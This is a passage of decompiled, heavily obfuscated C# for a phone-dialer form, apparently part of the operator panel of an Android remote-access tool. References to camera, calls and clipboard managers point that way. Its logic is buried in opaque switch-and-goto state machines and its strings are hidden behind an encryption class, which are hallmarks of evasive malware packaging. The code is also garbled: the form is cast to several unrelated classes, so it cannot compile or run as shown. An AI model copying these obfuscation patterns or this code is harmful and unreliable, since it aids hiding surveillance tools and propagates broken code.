          case 2:
            num1 = (int) num2 * 1518467395 ^ 1137025093;
            continue;
          case 3:
            goto label_3;
          case 4:
            goto label_6;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = 445124379;
      goto label_2;
    }

    private void CallPhone_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00312551029);
label_1:
      int num1 = -985735940;
      int fontSize;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~~((num1 + (-606141292 * 1305295143 * 1468865521 + (72605495 ^ (-1115157923 ^ -1335518227) - 1003828027 ^ (715651975 ^ -205660362) + ~-25281091)) ^ ~-1395827494) + -301273134 * -140453739)) % 7U)
        {
          case 0:
            this.TOpacity.Interval = Settings.T_Interval;
            num1 = 1309265707;
            continue;
          case 1:
            this.TextBox1.ContextMenuStrip = this.CMenu;
            // ISSUE: reference to a compiler-generated method
            fontSize = MySettings.get_Settings().FontSize;
            int num3 = !CallPhone.IsFontInstalled(EXGuarder.\u0033A642F0F) ? 1733575049 : (num3 = -1542734095);
            num1 = num3 ^ (int) num2 * -423895883;
            continue;
          case 2:
            this.b_DEL.Text = EXGuarder.\u0030A760930;
            num1 = -1787595272;
            continue;
          case 3:
            this.b_DEL.Text = EXGuarder.\u0033B2A245C;
            num1 = (int) num2 * -1910096901 ^ -996303736;
            continue;
          case 4:
            goto label_1;
          case 6:
            this.b_DEL.Font = new Font(EXGuarder.\u0033A642F0F, (float) fontSize, FontStyle.Regular);
            num1 = (int) num2 * -1072691149 ^ 1335444328;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      this.TOpacity.Enabled = true;
    }

    public static bool IsFontInstalled(string FontName)
    {
      Font font = new Font(FontName, 10f);
      try
      {
        return string.Compare(FontName, font.Name, StringComparison.InvariantCultureIgnoreCase) == 0;
      }
      finally
      {
        if (font != null)
        {
label_3:
          int num1 = -1667313178;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) (~(--(num1 - (~267116224 + (-150987675 * -973490222 - -439852621) - (-950449711 * 178105021 - 1938318490)) * -997196601) + -(-730096940 ^ 1339381847)) - 742230677)) % 3U)
            {
              case 0:
                goto label_3;
              case 2:
                font.Dispose();
                num1 = (int) num2 * 740768337 ^ 1373075072;
                continue;
              default:
                goto label_6;
            }
          }
        }
label_6:;
      }
    }

    private void Panel1_Paint(object sender, PaintEventArgs e)
    {
      e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
label_1:
      int num1 = 423159977;
      Color defaultColorForeground;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 * 533742329 - (~(1336261058 - 435047774 - (-2026880147 - -192065412)) - ---1388387949 * 1087441833)) - -(-1637725042 - 357411010))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num2 * 744368562 ^ 1071365438;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      if (((CameraManager) this).RectInputText0.Count <= 0)
        return;
      List<Rectangle>.Enumerator enumerator;
      try
      {
        enumerator = ((CameraManager) this).RectInputText0.GetEnumerator();
label_7:
        int num3 = -1859359845;
        Rectangle current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~(num3 * 533742329 - (~(1336261058 - 435047774 - (-2026880147 - -192065412)) - ---1388387949 * 1087441833)) - -(-1637725042 - 357411010))) % 6U)
          {
            case 0:
              int num5;
              num3 = num5 = enumerator.MoveNext() ? -1477972453 : (num5 = -41393277);
              continue;
            case 1:
              goto label_9;
            case 2:
              goto label_7;
            case 3:
              current = enumerator.Current;
              int num6;
              num3 = num6 = current.Width <= 0 ? -1727315888 : (num6 = 428052174);
              continue;
            case 4:
              e.Graphics.FillRectangle((Brush) new SolidBrush(defaultColorForeground), current);
              num3 = (int) num4 * -229462769 ^ -388040798;
              continue;
            case 5:
              num3 = (int) num4 * 1172569712 ^ 1915550112;
              continue;
            default:
              goto label_3;
          }
        }
label_9:
        return;
label_3:;
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    private void b1_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0030C1B0536;
      textBox1.Text = str;
    }

    private void b2_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00362676340;
      textBox1.Text = str;
    }

    private void b3_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00362524140;
      textBox1.Text = str;
    }

    private void b4_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0030B613B21;
      textBox1.Text = str;
    }

    private void b5_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0031912421D;
      textBox1.Text = str;
    }

    private void b6_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0032C5E493B;
      textBox1.Text = str;
    }

    private void b7_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0032B67782D;
      textBox1.Text = str;
    }

    private void b8_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00319131875;
      textBox1.Text = str;
    }

    private void b9_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00373075135;
      textBox1.Text = str;
    }

    private void b0_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00356233D0E;
      textBox1.Text = str;
    }

    private void b_DEL_Click(object sender, EventArgs e)
    {
      if (this.TextBox1.Text.Length <= 0)
        return;
label_1:
      int num1 = -101471343;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-~~((-806071201 * -1776434025 - ~(418344615 * ~-1497162212 - (1260531092 - 1474728814) * -1580330519) - num2) * 706622221) ^ -816969735)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1));
            num1 = (int) num3 * 623670571 ^ -948274158;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void B_star_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u00352632719;
      textBox1.Text = str;
    }

    private void B_hash_Click(object sender, EventArgs e)
    {
      TextBox textBox1;
      string str = (textBox1 = this.TextBox1).Text + EXGuarder.\u0033E734357;
      textBox1.Text = str;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }

    private void TextBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void TextBox1_KeyPress(object sender, KeyPressEventArgs e)
    {
      if (!((CameraManager) this)._keyback)
        goto label_6;
label_1:
      int num1 = 1818944716;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-num1 - -(~-232232082 - (1613128290 - 197822630)) ^ (-1262994305 ^ -1516925356) - -396944279 * 1638203365)) % 6U)
        {
          case 0:
            num1 = (int) num2 * -196693492 ^ -1447747670;
            continue;
          case 1:
            e.Handled = false;
            num1 = (int) num2 * 1561547678 ^ -1266302857;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_6;
          case 4:
            e.Handled = true;
            num1 = (int) num2 * 1245375712 ^ 2119751810;
            continue;
          case 5:
            goto label_3;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_6:
      num1 = EXGuarder.\u0034C330D67.Contains(e.KeyChar.ToString()) ? 2112797314 : (num1 = 1433538439);
      goto label_2;
    }

    private void TextBox1_KeyDown(object sender, KeyEventArgs e)
    {
      if (e.KeyCode != Keys.Back)
        goto label_4;
label_1:
      int num1 = 252119196;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(--(num1 ^ ~(351793663 + (-823093559 + ~-1824041888) + ~557253740 * 1597206365)) - (-1029452441 ^ -2014055725 ^ --192308953) - ~820876401)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -2061095396 ^ 44817256;
            continue;
          case 3:
            ((CameraManager) this)._keyback = true;
            num1 = (int) num2 * -676811461 ^ 1410781620;
            continue;
          case 4:
            goto label_4;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_4:
      ((CameraManager) this)._keyback = false;
      num1 = 933038696;
      goto label_2;
    }

    private void CutToolStripMenuItem_Click(object sender, EventArgs e) => this.TextBox1.Cut();

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e) => this.TextBox1.Copy();

    private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
    {
      string str1 = EXGuarder.\u00345235306;
label_1:
      int num1 = -1441218743;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string text;
        string str2;
        int index;
        switch ((num3 = (uint) -((-((77980609 - ((-1308788367 ^ -1807092499) - -675343271 - (394008883 * 813391026 + 2127353591))) * 960459991 - num2 ^ 265166977 ^ 1012817841) ^ ~-1295240131 * -906989065) * -1910672897)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            char ch = str2[index];
            int num4;
            num1 = num4 = !str1.ToString().Contains(Conversions.ToString(ch)) ? -864249218 : (num4 = 1319730619);
            continue;
          case 2:
            int num5 = !MyComputer.get_Computer().Clipboard.ContainsText() ? 1829373679 : (num5 = 347309740);
            num1 = num5 ^ (int) num3 * -1370999724;
            continue;
          case 3:
            goto label_3;
          case 4:
            this.TextBox1.Paste();
            num1 = -864249218;
            continue;
          case 5:
            int num6;
            num1 = num6 = index < str2.Length ? 1568124424 : (num6 = -1740813945);
            continue;
          case 6:
            num1 = (int) num3 * -565278191 ^ -261169238;
            continue;
          case 7:
            index = 0;
            num1 = (int) num3 * 582085738 ^ -753263481;
            continue;
          case 8:
            checked { ++index; }
            num1 = (int) num3 * 195391411 ^ -746121568;
            continue;
          case 9:
            text = MyComputer.get_Computer().Clipboard.GetText();
            num1 = (int) num3 * -199725405 ^ -1143260359;
            continue;
          case 10:
            str2 = text;
            num1 = (int) num3 * 1725776274 ^ 868144778;
            continue;
          case 11:
            int num7 = text.Length > 1500 ? 1852202276 : (num7 = 1703315378);
            num1 = num7 ^ (int) num3 * -1600641399;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
    {
      ((CameraManager) this)._Call = EXGuarder.\u00310686975;
      this.DialogResult = DialogResult.OK;
    }

    public CallPhone()
    {
label_1:
      int num1 = 1859994382;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-((1972062406 - -802189560) * 1988617409 + (--2066352852 ^ 2049371681 * -259158519) - (~(-1665823284 * -763064325 ^ -407065267 - 1781124992) * 751726935 - -num2) - ~-2110998333) ^ 1973095709)) % 5U)
        {
          case 1:
            this.Load += new EventHandler(((CallsManager) this).CallsManager_Load);
            this.Activated += new EventHandler(((CallsManager) this).AngelAndroidForm_Activated);
            num1 = (int) num3 * -1454636379 ^ -1170317295;
            continue;
          case 2:
            ((Color_Box0) this).BoxTitlePaintEventArgsWait = false;
            num1 = (int) num3 * 1776987867 ^ 38911453;
            continue;
          case 3:
            this.Deactivate += new EventHandler(((CallsManager) this).AngelAndroidForm_Deactivate);
            ((ClipboardManager) this).Title = EXGuarder.\u0033C0A2B00;
            num1 = (int) num3 * -741595361 ^ -1864742764;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      ((CallsManager) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -251103079;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(-1737662222 - ~~((-(-~942291875 ^ (65401262 ^ 1043580519) - -601562313 * -2024416541) ^ ~--240380791) - num2 - (1800602274 - -(~-1426010472 ^ -1338877649))))) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              ((CameraManager) this).components.Dispose();
              num1 = (int) num3 * -96259027 ^ -1077980130;
              continue;
            case 2:
              int num4 = ((CameraManager) this).components == null ? 1481669127 : (num4 = 1469661678);
              num1 = num4 ^ (int) num3 * 806716992;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
